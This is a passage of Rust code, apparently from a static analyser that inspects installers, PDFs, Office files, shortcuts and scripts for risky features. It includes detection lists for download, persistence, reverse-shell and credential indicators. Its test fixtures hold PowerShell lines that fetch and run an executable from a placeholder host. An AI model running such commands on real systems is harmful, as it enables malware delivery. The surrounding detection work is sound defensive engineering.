        for row in rows.take(512) {
            if row.len() < 2 {
                continue;
            }
            let key = row[0].to_string().to_ascii_uppercase();
            let value = metadata_value(Some(&row[1].to_string()));
            match key.as_str() {
                "PRODUCTNAME" => product.product_name = value,
                "MANUFACTURER" => product.manufacturer = value,
                "PRODUCTVERSION" => product.product_version = value,
                "PRODUCTCODE" => product.product_code = value,
                "UPGRADECODE" => product.upgrade_code = value,
                _ => {}
            }
        }
    }
    if product.is_meaningful() {
        analysis.products.push(product);
    }
    if let Ok(rows) = package.select_rows(Select::table("File")) {
        for row in rows {
            if !budget.can_enter(1) {
                break;
            }
            let name = if row.len() > 1 {
                escape_component_name(&row[1].to_string())
            } else {
                "<unnamed>".into()
            };
            let size = if row.len() > 2 {
                row[2].to_string().parse::<u64>().unwrap_or(0)
            } else {
                0
            };
            let child_path = if nesting_path.is_empty() {
                name.clone()
            } else {
                format!("{nesting_path}/{name}")
            };
            analysis.components.push(ComponentEvidence {
                nesting_path: child_path,
                name,
                size,
                sha256: None,
                formats: Vec::new(),
                severity: if size > budget.limits.entry_max_bytes {
                    Severity::Medium
                } else {
                    Severity::Info
                },
                signed: None,
                evidence: vec![evidence(
                    format!("msi:file:{}", analysis.components.len()),
                    "installer_file",
                    Severity::Info,
                    "MSI File table declares an installed file",
                    "MSI database parser",
                    Confidence::Structural,
                )],
            });
        }
    }
    for (table, category, severity, summary) in [
        (
            "Registry",
            "registry_change",
            Severity::Medium,
            "MSI Registry table declares registry changes",
        ),
        (
            "ServiceInstall",
            "service_install",
            Severity::Medium,
            "MSI ServiceInstall table declares services",
        ),
        (
            "Shortcut",
            "shortcut_install",
            Severity::Low,
            "MSI Shortcut table declares shortcuts",
        ),
        (
            "CustomAction",
            "installer_exec",
            Severity::Medium,
            "MSI CustomAction table declares installer actions",
        ),
        (
            "LaunchCondition",
            "launch_condition",
            Severity::Low,
            "MSI LaunchCondition table contains conditions",
        ),
    ] {
        if let Ok(rows) = package.select_rows(Select::table(table)) {
            let count = rows.count();
            if count > 0 {
                analysis.inference.push(evidence(
                    format!("msi:{table}"),
                    category,
                    severity,
                    format!("{summary} ({count} rows)"),
                    "MSI database parser",
                    Confidence::Structural,
                ));
            }
        }
    }
    let stream_names: Vec<String> = package.streams().collect();
    for stream_name in stream_names {
        if !budget.can_enter(1) {
            break;
        }
        let mut reader = match package.read_stream(&stream_name) {
            Ok(reader) => reader,
            Err(error) => {
                analysis.boundaries.push(Boundary {
                    kind: BoundaryKind::UnsupportedFormat,
                    detail: format!("MSI stream {stream_name} could not be read: {error}"),
                });
                continue;
            }
        };
        let mut bytes = Vec::new();
        if std::io::Read::by_ref(&mut reader)
            .take(budget.limits.entry_max_bytes.saturating_add(1))
            .read_to_end(&mut bytes)
            .is_err()
            || bytes.len() as u64 > budget.limits.entry_max_bytes
            || !budget.account(bytes.len() as u64)
        {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::BudgetExceeded,
                detail: format!("MSI stream {stream_name} exceeded the decompression budget"),
            });
            continue;
        }
        let name = escape_component_name(&stream_name);
        let member_path = PathBuf::from(&name);
        let sniff = detect::sniff(
            &member_path,
            &bytes[..bytes.len().min(64 * 1024)],
            &bytes[bytes.len().saturating_sub(1024 * 1024)..],
            bytes.len() as u64,
        );
        let severity = if sniff
            .evidence
            .iter()
            .any(|item| item.severity >= Severity::Medium)
            || sniff
                .classification
                .formats
                .iter()
                .any(|format| matches!(format.kind.as_str(), "pe" | "cab"))
        {
            Severity::Medium
        } else {
            Severity::Info
        };
        let signed = sign_status(&bytes);
        let stored_path = if nesting_path.is_empty() {
            name.clone()
        } else {
            format!("{nesting_path}/{name}")
        };
        record_pe_product(&bytes, &stored_path, analysis);
        analysis.components.push(ComponentEvidence {
            nesting_path: stored_path,
            name,
            size: bytes.len() as u64,
            sha256: Some(hex::encode(Sha256::digest(&bytes))),
            formats: sniff.classification.formats,
            severity,
            signed,
            evidence: sniff.evidence,
        });
    }
}

fn analyze_nsis(
    data: &[u8],
    nesting_path: &str,
    budget: &mut Budget<'_>,
    analysis: &mut ChildAnalysis,
) {
    let installer = match nsis::NsisInstaller::from_bytes(data) {
        Ok(value) => value,
        Err(error) => {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::UnsupportedFormat,
                detail: format!("NSIS parser rejected the structure: {error}"),
            });
            return;
        }
    };
    for command in installer.exec_commands().flatten() {
        analysis.inference.push(evidence(
            format!("nsis:exec:{}", analysis.inference.len()),
            "installer_exec",
            Severity::Medium,
            format!("NSIS installer can execute a command: {command:?}"),
            "NSIS static parser",
            Confidence::Structural,
        ));
    }
    for registry in installer.registry_ops().flatten() {
        analysis.inference.push(evidence(
            format!("nsis:registry:{}", analysis.inference.len()),
            "registry_change",
            Severity::Low,
            format!("NSIS installer contains a registry operation: {registry:?}"),
            "NSIS static parser",
            Confidence::Structural,
        ));
    }
    for file in installer.files().flatten() {
        if !budget.can_enter(1) {
            break;
        }
        let name = file
            .name()
            .map(|value| escape_component_name(&value.to_string()))
            .unwrap_or_else(|_| "<unnamed>".into());
        if file.data().len() as u64 > budget.limits.entry_max_bytes {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::BudgetExceeded,
                detail: format!("NSIS member {name} exceeds the entry budget"),
            });
            continue;
        }
        let member = match file.decompress() {
            Ok(value) => value,
            Err(error) => {
                analysis.boundaries.push(Boundary {
                    kind: BoundaryKind::UnsupportedFormat,
                    detail: format!("NSIS member {name} could not be decompressed: {error}"),
                });
                continue;
            }
        };
        if !budget.account(member.len() as u64) {
            break;
        }
        let child_path = if nesting_path.is_empty() {
            name.clone()
        } else {
            format!("{nesting_path}/{name}")
        };
        let head = &member[..member.len().min(64 * 1024)];
        let tail = &member[member.len().saturating_sub(1024 * 1024)..];
        let sniff = detect::sniff(Path::new(&name), head, tail, member.len() as u64);
        let severity = if sniff
            .classification
            .formats
            .iter()
            .any(|format| format.kind == "pe")
        {
            Severity::Medium
        } else {
            Severity::Info
        };
        let signed = sign_status(&member);
        record_pe_product(&member, &child_path, analysis);
        analysis.components.push(ComponentEvidence {
            nesting_path: child_path,
            name,
            size: member.len() as u64,
            sha256: Some(hex::encode(Sha256::digest(&member))),
            formats: sniff.classification.formats,
            severity,
            signed,
            evidence: sniff.evidence,
        });
    }
}

fn analyze_inno(
    data: &[u8],
    nesting_path: &str,
    budget: &mut Budget<'_>,
    analysis: &mut ChildAnalysis,
) {
    let cursor = Cursor::new(data);
    let mut installer = match inno::Inno::new(cursor) {
        Ok(value) => value,
        Err(error) => {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::UnsupportedFormat,
                detail: format!("Inno parser rejected the structure: {error}"),
            });
            return;
        }
    };
    let app_name = installer
        .inner
        .header
        .app_name()
        .unwrap_or("<unnamed>")
        .to_string();
    analysis.products.push(ProductIdentityEvidence {
        product_name: metadata_value(Some(&app_name)),
        source: "Inno Setup application metadata".into(),
        nesting_path: (!nesting_path.is_empty()).then(|| nesting_path.to_string()),
        ..ProductIdentityEvidence::default()
    });
    analysis.inference.push(evidence(
        "inno:app-name",
        "installer_identity",
        Severity::Info,
        format!("Inno installer declares application name: {app_name}"),
        "Inno static parser",
        Confidence::Structural,
    ));
    let mut extracted = Vec::new();
    for item in installer.files() {
        let Ok((entry, bytes)) = item else {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::UnsupportedFormat,
                detail: "Inno payload could not be decompressed".into(),
            });
            continue;
        };
        if !budget.can_enter(1) {
            break;
        }
        if bytes.len() as u64 > budget.limits.entry_max_bytes || !budget.account(bytes.len() as u64)
        {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::BudgetExceeded,
                detail: "Inno payload exceeded the decompression budget".into(),
            });
            continue;
        }
        let name = escape_component_name(
            entry
                .file()
                .destination()
                .filter(|value| !value.is_empty())
                .unwrap_or("<unnamed>"),
        );
        extracted.push((name, bytes));
    }
    for (name, member) in extracted {
        let member_path = PathBuf::from(&name);
        let sniff = detect::sniff(
            &member_path,
            &member[..member.len().min(64 * 1024)],
            &member[member.len().saturating_sub(1024 * 1024)..],
            member.len() as u64,
        );
        let severity = if sniff
            .evidence
            .iter()
            .any(|item| item.severity >= Severity::Medium)
            || sniff
                .classification
                .formats
                .iter()
                .any(|format| format.kind == "pe")
        {
            Severity::Medium
        } else {
            Severity::Info
        };
        let signed = sign_status(&member);
        let child_path = if nesting_path.is_empty() {
            name.clone()
        } else {
            format!("{nesting_path}/{name}")
        };
        record_pe_product(&member, &child_path, analysis);
        analysis.components.push(ComponentEvidence {
            nesting_path: child_path,
            name,
            size: member.len() as u64,
            sha256: Some(hex::encode(Sha256::digest(&member))),
            formats: sniff.classification.formats,
            severity,
            signed,
            evidence: sniff.evidence,
        });
    }
    for entry in installer.run_entries() {
        analysis.inference.push(evidence(
            format!("inno:run:{}", analysis.inference.len()),
            "installer_exec",
            Severity::Medium,
            format!(
                "Inno installer contains a run entry: {}",
                entry.name().unwrap_or("<unnamed>")
            ),
            "Inno static parser",
            Confidence::Inferred,
        ));
    }
}

fn inspect_document_features(
    data: &[u8],
    classification: &Classification,
    analysis: &mut ChildAnalysis,
) {
    let kinds: BTreeSet<_> = classification
        .formats
        .iter()
        .map(|format| format.kind.as_str())
        .collect();
    if kinds.contains("pdf") {
        for marker in [
            "/JavaScript",
            "/JS",
            "/Launch",
            "/EmbeddedFile",
            "/OpenAction",
            "/AA",
        ] {
            if pdf_marker_present(data, marker.as_bytes()) {
                let severity = if matches!(marker, "/JavaScript" | "/JS" | "/Launch") {
                    Severity::High
                } else {
                    Severity::Medium
                };
                analysis.facts.push(evidence(
                    format!("pdf:{}", marker.trim_start_matches('/')),
                    "pdf_active_content",
                    severity,
                    format!("PDF contains active or embedded-content marker {marker}"),
                    "child PDF marker scan",
                    Confidence::Inferred,
                ));
            }
        }
    }
    if kinds.contains("svg") {
        let text = String::from_utf8_lossy(data).to_ascii_lowercase();
        for marker in [
            "<script",
            "onload=",
            "onclick=",
            "javascript:",
            "xlink:href",
        ] {
            if text.contains(marker) {
                analysis.facts.push(evidence(
                    format!("svg:{}", marker.replace(['<', '=', ':'], "_")),
                    "svg_active_content",
                    Severity::High,
                    format!("SVG contains active-content marker {marker}"),
                    "child SVG scan",
                    Confidence::Structural,
                ));
            }
        }
    }
    if kinds.iter().any(|kind| kind.starts_with("ooxml:"))
        || classification
            .formats
            .iter()
            .any(|format| format.kind == "zip")
    {
        for marker in [b"vbaProject.bin".as_slice(), b"externalLink".as_slice()] {
            if contains_ascii(data, marker) {
                analysis.facts.push(evidence(
                    format!("ooxml:{}", String::from_utf8_lossy(marker)),
                    if marker == b"vbaProject.bin" {
                        "ooxml_macro"
                    } else {
                        "ooxml_external_link"
                    },
                    Severity::High,
                    format!(
                        "Office container contains {}",
                        String::from_utf8_lossy(marker)
                    ),
                    "child OOXML marker scan",
                    Confidence::Structural,
                ));
            }
        }
    }
    if kinds.contains("lnk") {
        let text = String::from_utf8_lossy(data).to_ascii_lowercase();
        if [".exe", ".ps1", ".bat", ".cmd", ".vbs", "powershell"]
            .iter()
            .any(|marker| text.contains(marker))
        {
            analysis.facts.push(evidence(
                "lnk:executable-target",
                "lnk_execution",
                Severity::High,
                "Windows shortcut references an executable or script",
                "child LNK scan",
                Confidence::Inferred,
            ));
        }
    }
}

fn pdf_marker_present(data: &[u8], marker: &[u8]) -> bool {
    let stream_ranges = detect::pdf_stream_ranges(data);
    let mut cursor = 0usize;
    while let Some(relative) = data[cursor..]
        .windows(marker.len())
        .position(|window| window == marker)
    {
        let offset = cursor + relative;
        if !stream_ranges
            .iter()
            .any(|(start, end)| offset as u64 >= *start && (offset as u64) < *end)
        {
            return true;
        }
        cursor = offset.saturating_add(marker.len());
        if cursor >= data.len() {
            break;
        }
    }
    false
}

fn is_ooxml_package_part(path: &str) -> bool {
    let path = path.replace('\\', "/").to_ascii_lowercase();
    path == "[content_types].xml"
        || path.starts_with("_rels/")
        || path.starts_with("docprops/")
        || path.starts_with("customxml/")
        || path.starts_with("word/")
        || path.starts_with("xl/")
        || path.starts_with("ppt/")
        || path.contains("/_rels/")
        || path.contains("/docprops/")
        || path.contains("/customxml/")
        || path.contains("/word/")
        || path.contains("/xl/")
        || path.contains("/ppt/")
}

fn is_ooxml_macro_part(path: &str) -> bool {
    let path = path.replace('\\', "/").to_ascii_lowercase();
    path == "vbaproject.bin" || path.ends_with("/vbaproject.bin")
}

fn is_ooxml_external_link_part(path: &str) -> bool {
    let path = path.replace('\\', "/").to_ascii_lowercase();
    path.starts_with("externallinks/") || path.contains("/externallinks/")
}

fn is_ooxml_activex_part(path: &str) -> bool {
    let path = path.replace('\\', "/").to_ascii_lowercase();
    path.starts_with("activex/") || path.contains("/activex/")
}

fn inspect_scripts(path: &Path, data: &[u8], analysis: &mut ChildAnalysis) {
    let extension = path
        .extension()
        .and_then(|value| value.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    let script = matches!(
        extension.as_str(),
        "ps1" | "bat" | "cmd" | "vbs" | "js" | "mjs" | "hta" | "py" | "pyw"
    );
    let config_file = matches!(
        extension.as_str(),
        "ini" | "conf" | "cfg" | "json" | "yaml" | "yml" | "xml" | "toml"
    );
    if !script && !config_file {
        return;
    }
    let text = String::from_utf8_lossy(data).to_ascii_lowercase();
    if script {
        let checks = [
            (
                "download",
                &["invoke-webrequest", "wget ", "curl ", "bitsadmin"][..],
                Severity::High,
            ),
            (
                "execution",
                &[
                    "start-process",
                    "invoke-expression",
                    "iex(",
                    "wscript.shell",
                ][..],
                Severity::High,
            ),
            (
                "evasion",
                &["-enc", "frombase64string", "hidden"][..],
                Severity::Medium,
            ),
            (
                "persistence",
                &["schtasks", "currentversion\\run", "new-service"][..],
                Severity::High,
            ),
            (
                "remote_access",
                &["reverse shell", "tcpclient", "connect(", "listener"][..],
                Severity::High,
            ),
            (
                "credential_material",
                &["password=", "passwd=", "api_key=", "token="][..],
                Severity::High,
            ),
        ];
        for (category, needles, severity) in checks {
            if needles.iter().any(|needle| text.contains(needle)) {
                analysis.facts.push(evidence(
                    format!("script:{category}"),
                    category,
                    severity,
                    format!("Script contains {category} behavior"),
                    "child script scan",
                    Confidence::Inferred,
                ));
            }
        }
        for url in extract_urls(data).into_iter().take(32) {
            analysis.facts.push(evidence(
                format!("script:url:{}", analysis.facts.len()),
                if text.contains("tcpclient") || text.contains("reverse shell") {
                    "remote_access_endpoint"
                } else {
                    "network_endpoint"
                },
                Severity::Medium,
                format!("Script references endpoint {url}"),
                "child URL extraction",
                Confidence::Structural,
            ));
        }
    }
    if config_file {
        for needle in ["password=", "passwd=", "api_key=", "token=", "secret="] {
            if text.contains(needle) {
                analysis.facts.push(evidence(
                    format!("config:credential:{needle}"),
                    "credential_material",
                    Severity::High,
                    format!("Configuration contains a credential-like field ({needle})"),
                    "child config scan",
                    Confidence::Inferred,
                ));
            }
        }
        if ["run=", "startup", "autostart", "currentversion\\run"]
            .iter()
            .any(|needle| text.contains(needle))
        {
            analysis.facts.push(evidence(
                "config:autostart",
                "autostart",
                Severity::High,
                "Configuration contains an autostart directive",
                "child config scan",
                Confidence::Inferred,
            ));
        }
    }
}

fn inspect_magic_polyglots(data: &[u8], analysis: &mut ChildAnalysis) {
    let formats = detect::scan_all(data);
    let top_level: HashSet<_> = analysis
        .classification
        .formats
        .iter()
        .filter(|format| format.offset == 0)
        .map(|format| format.kind.as_str())
        .collect();
    let unexpected: Vec<_> = formats
        .into_iter()
        .filter(|format| format.offset > 0 && !top_level.contains(format.kind.as_str()))
        .collect();
    if !unexpected.is_empty()
        && !analysis
            .facts
            .iter()
            .any(|fact| fact.category == "polyglot")
    {
        let primary_is_container = analysis
            .classification
            .formats
            .first()
            .is_some_and(|format| {
                matches!(
                    format.kind.as_str(),
                    "zip" | "rar" | "7z" | "cab" | "ole_cfb" | "msi"
                )
            });
        analysis.facts.push(Evidence {
            id: "polyglot:full-scan".into(),
            category: "polyglot".into(),
            severity: if primary_is_container {
                Severity::Medium
            } else {
                Severity::High
            },
            summary: if primary_is_container {
                "Nested container signatures occur inside the archive".into()
            } else {
                "Embedded file signatures occur at non-zero offsets".into()
            },
            detail: Some(
                unexpected
                    .iter()
                    .map(|format| format!("{}@{}", format.kind, format.offset))
                    .collect::<Vec<_>>()
                    .join(", "),
            ),
            provenance: "child full-buffer signature scan".into(),
            confidence: Confidence::Structural,
        });
    }
}

fn parse_certificate(der: &[u8]) -> (String, String, String, Vec<String>, Vec<String>) {
    let fallback_fingerprint = hex::encode(Sha256::digest(der));
    let mut urls = extract_urls(der);
    urls.sort();
    urls.dedup();
    let ocsp_urls = urls
        .iter()
        .filter(|url| url.to_ascii_lowercase().contains("ocsp"))
        .cloned()
        .collect();
    let crl_urls = urls
        .iter()
        .filter(|url| !url.to_ascii_lowercase().contains("ocsp"))
        .cloned()
        .collect();
    match X509Certificate::from_der(der) {
        Ok((_, certificate)) => (
            certificate.subject().to_string(),
            certificate.issuer().to_string(),
            certificate.raw_serial_as_string(),
            ocsp_urls,
            crl_urls,
        ),
        Err(_) => (
            "<unreadable certificate>".into(),
            "<unreadable issuer>".into(),
            fallback_fingerprint,
            ocsp_urls,
            crl_urls,
        ),
    }
}

fn certificate_usage(der: &[u8]) -> (bool, bool) {
    let Ok((_, certificate)) = X509Certificate::from_der(der) else {
        return (false, false);
    };
    let Ok(Some(usage)) = certificate.extended_key_usage() else {
        return (false, false);
    };
    (usage.value.code_signing, usage.value.time_stamping)
}

fn select_publisher(leaf_candidates: &[(String, bool, bool)]) -> Option<String> {
    leaf_candidates
        .iter()
        .find(|(_, code_signing, time_stamping)| *code_signing && !*time_stamping)
        .or_else(|| leaf_candidates.iter().find(|(_, _, timestamp)| !timestamp))
        .or_else(|| leaf_candidates.first())
        .map(|(subject, _, _)| subject.clone())
}

fn extract_urls(data: &[u8]) -> Vec<String> {
    let mut urls = Vec::new();
    for scheme in [b"https://".as_slice(), b"http://".as_slice()] {
        let mut start = 0;
        while let Some(relative) = find_bytes(&data[start..], scheme) {
            let offset = start + relative;
            let end = data[offset..]
                .iter()
                .position(|byte| {
                    byte.is_ascii_whitespace()
                        || matches!(*byte, b'"' | b'\'' | b'<' | b'>' | b')' | b']')
                })
                .map(|value| offset + value)
                .unwrap_or(data.len());
            if end.saturating_sub(offset) <= 2048
                && let Ok(value) = std::str::from_utf8(&data[offset..end])
                && value.contains('.')
            {
                urls.push(value.to_string());
            }
            start = end.max(offset + scheme.len());
            if start >= data.len() {
                break;
            }
        }
    }
    urls.sort();
    urls.dedup();
    urls
}

fn pe_overlay(data: &[u8]) -> Option<(u64, Vec<String>)> {
    if data.len() < 0x40 || !data.starts_with(b"MZ") {
        return None;
    }
    let pe = u32::from_le_bytes(data[0x3c..0x40].try_into().ok()?) as usize;
    if data.get(pe..pe + 4)? != b"PE\0\0" {
        return None;
    }
    let sections = u16::from_le_bytes(data.get(pe + 6..pe + 8)?.try_into().ok()?) as usize;
    let optional_size = u16::from_le_bytes(data.get(pe + 20..pe + 22)?.try_into().ok()?) as usize;
    let optional = pe.checked_add(24)?;
    let section_table = optional.checked_add(optional_size)?;
    let mut end = section_table.checked_add(sections.checked_mul(40)?)?;
    let mut names = Vec::new();
    for index in 0..sections {
        let entry = section_table.checked_add(index.checked_mul(40)?)?;
        let name = data.get(entry..entry + 8)?;
        names.push(
            String::from_utf8_lossy(name)
                .trim_end_matches('\0')
                .to_string(),
        );
        let raw_size = u32::from_le_bytes(data.get(entry + 16..entry + 20)?.try_into().ok()?);
        let raw_offset = u32::from_le_bytes(data.get(entry + 20..entry + 24)?.try_into().ok()?);
        end = end.max(raw_offset as usize + raw_size as usize);
    }
    Some((end as u64, names))
}

fn pe_has_signature_table(data: &[u8]) -> bool {
    if data.len() < 0x40 || !data.starts_with(b"MZ") {
        return false;
    }
    let pe = u32::from_le_bytes(data[0x3c..0x40].try_into().unwrap_or([0; 4])) as usize;
    let optional = pe.saturating_add(24);
    let magic = data.get(optional..optional + 2);
    let data_dir = match magic {
        Some([0x0B, 0x01]) => optional + 96,
        Some([0x0B, 0x02]) => optional + 112,
        _ => return false,
    };
    let security = data_dir.saturating_add(4 * 8);
    let offset = data
        .get(security..security + 4)
        .and_then(|value| value.try_into().ok())
        .map(u32::from_le_bytes)
        .unwrap_or(0);
    let size = data
        .get(security + 4..security + 8)
        .and_then(|value| value.try_into().ok())
        .map(u32::from_le_bytes)
        .unwrap_or(0);
    offset != 0 && size != 0
}

fn sign_status(data: &[u8]) -> Option<bool> {
    if !detect::is_pe(data) {
        return None;
    }
    Some(pe_has_signature_table(data))
}

fn record_pe_product(data: &[u8], nesting_path: &str, analysis: &mut ChildAnalysis) {
    if let Some(product) = pe_product_identity(data, Some(nesting_path.to_string())) {
        analysis.products.push(product);
    }
}

fn pe_product_identity(
    data: &[u8],
    nesting_path: Option<String>,
) -> Option<ProductIdentityEvidence> {
    let pe = goblin::pe::PE::parse(data).ok()?;
    let version = pe.resource_data?.version_info?;
    let strings = version.string_info;
    let product = ProductIdentityEvidence {
        product_name: metadata_value(strings.product_name().as_deref()),
        manufacturer: metadata_value(strings.company_name().as_deref()),
        product_version: metadata_value(strings.product_version().as_deref()).or_else(|| {
            version
                .fixed_info
                .map(|fixed| fixed.product_version().to_string())
                .and_then(|value| metadata_value(Some(&value)))
        }),
        original_filename: metadata_value(strings.original_filename().as_deref()),
        file_description: metadata_value(strings.file_description().as_deref()),
        legal_copyright: metadata_value(strings.legal_copyright().as_deref()),
        source: "PE version information".into(),
        nesting_path,
        ..ProductIdentityEvidence::default()
    };
    product.is_meaningful().then_some(product)
}

fn metadata_value(value: Option<&str>) -> Option<String> {
    value
        .map(escape_component_name)
        .map(|value| value.trim().to_string())
        .filter(|value| !value.is_empty())
}

fn note_product_identity_mismatch(
    path: &Path,
    product: &ProductIdentityEvidence,
    analysis: &mut ChildAnalysis,
) {
    let Some(downloaded_name) = path
        .file_name()
        .and_then(|value| value.to_str())
        .map(escape_component_name)
    else {
        return;
    };
    let Some(original_name) = product.original_filename.as_deref() else {
        return;
    };
    if downloaded_name.eq_ignore_ascii_case(original_name) {
        return;
    }
    let product_name = product.product_name.as_deref().unwrap_or("not declared");
    let manufacturer = product.manufacturer.as_deref().unwrap_or("not declared");
    analysis.facts.push(Evidence {
        id: "identity:filename-mismatch".into(),
        category: "product_identity".into(),
        severity: Severity::Medium,
        summary: format!(
            "Downloaded file name {downloaded_name} differs from embedded original filename {original_name}"
        ),
        detail: Some(format!(
            "Declared product: {product_name}; declared manufacturer: {manufacturer}"
        )),
        provenance: "child PE version resource".into(),
        confidence: Confidence::Structural,
    });
}

fn evidence(
    id: impl Into<String>,
    category: &str,
    severity: Severity,
    summary: impl Into<String>,
    provenance: &str,
    confidence: Confidence,
) -> Evidence {
    Evidence {
        id: id.into(),
        category: category.into(),
        severity,
        summary: summary.into(),
        detail: None,
        provenance: provenance.into(),
        confidence,
    }
}

fn escape_component_name(value: &str) -> String {
    value
        .chars()
        .map(|ch| if ch.is_control() { '\u{FFFD}' } else { ch })
        .take(1024)
        .collect()
}

fn is_enclosed_component_name(value: &str) -> bool {
    if value.is_empty() || value.contains('\0') {
        return false;
    }
    let path = Path::new(value);
    !path.is_absolute()
        && path
            .components()
            .all(|component| matches!(component, std::path::Component::Normal(_)))
}

fn is_reserved_windows_name(value: &str) -> bool {
    let base = value
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(value)
        .split('.')
        .next()
        .unwrap_or(value)
        .to_ascii_uppercase();
    matches!(base.as_str(), "CON" | "PRN" | "AUX" | "NUL")
        || (base.len() == 4
            && (base.starts_with("COM") || base.starts_with("LPT"))
            && base.as_bytes()[3].is_ascii_digit())
}

fn contains_ascii(data: &[u8], needle: &[u8]) -> bool {
    data.windows(needle.len()).any(|window| window == needle)
}

fn contains_ascii_case(data: &[u8], needle: &[u8]) -> bool {
    data.windows(needle.len()).any(|window| {
        window
            .iter()
            .zip(needle)
            .all(|(left, right)| left.eq_ignore_ascii_case(right))
    })
}

fn find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack
        .windows(needle.len())
        .position(|window| window == needle)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn limits() -> AnalysisLimits {
        AnalysisLimits {
            entry_max_bytes: 1024 * 1024,
            total_output_max_bytes: 8 * 1024 * 1024,
            max_entries: 100,
            max_depth: 4,
            compression_ratio_warning: 200,
        }
    }

    #[test]
    fn script_findings_are_reported() {
        let analysis = analyze_bytes(
            Path::new("update.ps1"),
            b"Invoke-WebRequest https://example.invalid/a.exe -OutFile a.exe; Start-Process a.exe",
            &limits(),
        );
        assert!(
            analysis
                .facts
                .iter()
                .any(|fact| fact.category == "download")
        );
        assert!(
            analysis
                .facts
                .iter()
                .any(|fact| fact.category == "network_endpoint")
        );
    }

    #[test]
    fn renamed_installer_identity_mismatch_is_reported() {
        let product = ProductIdentityEvidence {
            product_name: Some("Microsoft SQL Server 2014".into()),
            manufacturer: Some("Microsoft Corporation".into()),
            original_filename: Some("SqlSetupBootstrapper.exe".into()),
            ..ProductIdentityEvidence::default()
        };
        let mut analysis = ChildAnalysis::default();
        note_product_identity_mismatch(Path::new("ddu-18.1.6.0.exe"), &product, &mut analysis);
        let evidence = analysis
            .facts
            .iter()
            .find(|fact| fact.category == "product_identity")
            .expect("identity mismatch should be reported");
        assert!(evidence.summary.contains("ddu-18.1.6.0.exe"));
        assert!(evidence.summary.contains("SqlSetupBootstrapper.exe"));
        assert!(
            evidence
                .detail
                .as_deref()
                .is_some_and(|detail| { detail.contains("Microsoft SQL Server 2014") })
        );
    }

    #[test]
    fn pe_extension_and_header_type_mismatch_is_high_risk() {
        assert_eq!(
            pe_type_mismatch_severity("dll", false),
            Some(Severity::High)
        );
        assert_eq!(
            pe_type_mismatch_severity("exe", true),
            Some(Severity::Medium)
        );
        assert_eq!(pe_type_mismatch_severity("dll", true), None);
        assert_eq!(pe_type_mismatch_severity("exe", false), None);
        assert_eq!(pe_type_mismatch_severity("bin", false), None);
    }

    #[test]
    fn code_signing_owner_is_preferred_over_timestamp_responder() {
        let candidates = vec![
            ("DigiCert Timestamp Responder".into(), false, true),
            ("Google LLC".into(), true, false),
        ];
        assert_eq!(select_publisher(&candidates).as_deref(), Some("Google LLC"));
    }

    #[test]
    fn pdf_javascript_is_high_severity() {
        let analysis = analyze_bytes(
            Path::new("invoice.pdf"),
            b"%PDF-1.7\n/JavaScript 1 0 R\n%%EOF",
            &limits(),
        );
        assert!(
            analysis
                .facts
                .iter()
                .any(|fact| fact.category == "pdf_active_content")
        );
    }

    #[test]
    fn pdf_marker_text_inside_a_stream_is_not_active_content() {
        let document = b"%PDF-1.7\n1 0 obj\n<< /Length 21 >>\nstream\nrandom data /JS noise\nendstream\nendobj\n%%EOF";
        let analysis = analyze_bytes(Path::new("paper.pdf"), document, &limits());
        assert!(
            !analysis
                .facts
                .iter()
                .any(|fact| fact.category == "pdf_active_content")
        );
    }

    #[test]
    fn ordinary_ooxml_parts_do_not_trigger_script_or_polyglot_findings() {
        let mut bytes = Cursor::new(Vec::new());
        {
            let mut zip = zip::ZipWriter::new(&mut bytes);
            let options = zip::write::SimpleFileOptions::default();
            zip.start_file("[Content_Types].xml", options).unwrap();
            std::io::Write::write_all(
                &mut zip,
                br#"<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/></Types>"#,
            )
            .unwrap();
            zip.start_file("ppt/slides/slide1.xml", options).unwrap();
            std::io::Write::write_all(
                &mut zip,
                br#"<p:sld xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><a:t>clientSocket.connect((serverName, serverPort))</a:t><a:t>Transport layer listener</a:t></p:sld>"#,
            )
            .unwrap();
            zip.start_file("ppt/slides/_rels/slide1.xml.rels", options)
                .unwrap();
            std::io::Write::write_all(
                &mut zip,
                br#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>"#,
            )
            .unwrap();
            zip.finish().unwrap();
        }

        let analysis = analyze_bytes(Path::new("lecture.pptx"), bytes.get_ref(), &limits());
        assert!(!analysis.facts.iter().any(|fact| {
            fact.severity >= Severity::High
                || fact.category == "polyglot"
                || fact.category == "extension_mismatch"
        }));
    }

    #[test]
    fn ooxml_macro_parts_remain_high_severity() {
        let mut bytes = Cursor::new(Vec::new());
        {
            let mut zip = zip::ZipWriter::new(&mut bytes);
            let options = zip::write::SimpleFileOptions::default();
            zip.start_file("word/vbaProject.bin", options).unwrap();
            std::io::Write::write_all(&mut zip, b"macro project").unwrap();
            zip.finish().unwrap();
        }

        let analysis = analyze_bytes(Path::new("macro-enabled.docx"), bytes.get_ref(), &limits());
        assert!(
            analysis
                .facts
                .iter()
                .any(|fact| fact.category == "ooxml_macro" && fact.severity == Severity::High)
        );
    }

    #[test]
    fn zip_entries_are_analysed_without_disk_writes() {
        let mut bytes = Cursor::new(Vec::new());
        {
            let mut zip = zip::ZipWriter::new(&mut bytes);
            let options = zip::write::SimpleFileOptions::default();
            zip.start_file("../escape.exe", options).unwrap();
            std::io::Write::write_all(&mut zip, b"MZ").unwrap();
            zip.finish().unwrap();
        }
        let analysis = analyze_bytes(Path::new("sample.zip"), bytes.get_ref(), &limits());
        assert!(
            analysis
                .facts
                .iter()
                .any(|fact| fact.category == "archive_path_traversal")
        );
    }

    #[test]
    fn rar_inside_zip_is_analysed_recursively_in_memory() {
        let mut rar = rar_codec::ArchiveBuilder::new();
        rar.add_stored(
            "payload.ps1",
            b"Invoke-WebRequest https://example.invalid/payload.exe",
        )
        .unwrap();
        let rar = rar.finish();

        let mut bytes = Cursor::new(Vec::new());
        {
